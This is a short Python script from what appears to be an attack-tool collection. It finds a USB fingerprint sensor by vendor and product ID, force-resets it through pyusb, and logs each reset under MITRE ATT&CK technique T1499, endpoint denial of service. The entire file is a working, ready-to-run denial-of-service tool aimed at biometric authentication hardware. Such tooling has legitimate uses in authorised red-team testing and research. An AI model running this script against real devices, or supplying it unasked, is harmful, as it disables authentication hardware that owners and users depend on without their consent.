#!/usr/bin/env python3
# modules/attacks/fingerprint_sensor_rebooter.py

import os
import time
import json
import argparse
from datetime import datetime
import usb.core
import usb.util

LOG_FILE = "results/fingerprint_sensor_reboot_log.json"
MITRE_TTP = "T1499"

def log_event(vid, pid, action):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "device_vid": hex(vid),
        "device_pid": hex(pid),
        "action": action,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def reboot_fingerprint_sensor(vid, pid):
    dev = usb.core.find(idVendor=vid, idProduct=pid)
    if dev is None:
        print("[!] Device not found.")
        return
    try:
        dev.reset()
        log_event(vid, pid, "reset")
        print(f"[✓] Fingerprint sensor {hex(vid)}:{hex(pid)} reset successfully.")
    except Exception as e:
        print(f"[!] Failed to reset device: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Force reboot fingerprint sensors via USB")
    parser.add_argument("--vid", type=lambda x: int(x, 16), required=True, help="Vendor ID (hex)")
    parser.add_argument("--pid", type=lambda x: int(x, 16), required=True, help="Product ID (hex)")
    args = parser.parse_args()

    reboot_fingerprint_sensor(args.vid, args.pid)
